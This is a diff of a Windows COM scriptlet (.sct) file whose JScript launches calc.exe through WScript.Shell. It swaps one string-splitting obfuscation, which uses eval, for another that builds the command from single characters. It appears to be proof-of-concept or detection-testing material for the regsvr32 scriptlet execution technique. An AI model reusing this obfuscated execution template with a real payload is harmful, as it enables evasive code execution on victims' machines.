@@ -1,20 +1,28 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="DynamicEvalProgID"
+    progid="SimpleObfuscation"
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
 	<script language="JScript">
 		<![CDATA[
-			// Dynamic string construction for obfuscation
-			var parts = ['calc', '.', 'e', 'x', 'e'];
-			var command = parts[0] + parts[1] + parts[2] + parts[3] + parts[4];
+			// Simple string splitting and reconstruction for command execution
+			var part1 = 'c';
+			var part2 = 'a';
+			var part3 = 'l';
+			var part4 = 'c';
+			var part5 = '.';
+			var part6 = 'e';
+			var part7 = 'x';
+			var part8 = 'e';
 			
-			// Dynamically construct ActiveXObject string
-			var objName = ['WScrip', 't.Shel', 'l'].join('');
+			// Concatenate the parts to form the command
+			var command = part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8;
 			
-			// Use eval for dynamic execution
-			var runCommand = 'new ActiveXObject(objName).Run(command);';
-			eval(runCommand);
+			// Dynamically get the WScript.Shell object
+			var shell = new ActiveXObject("WScript.Shell");
+			
+			// Execute the command
+			shell.Run(command);
 		]]>
 	</script>
 </registration>
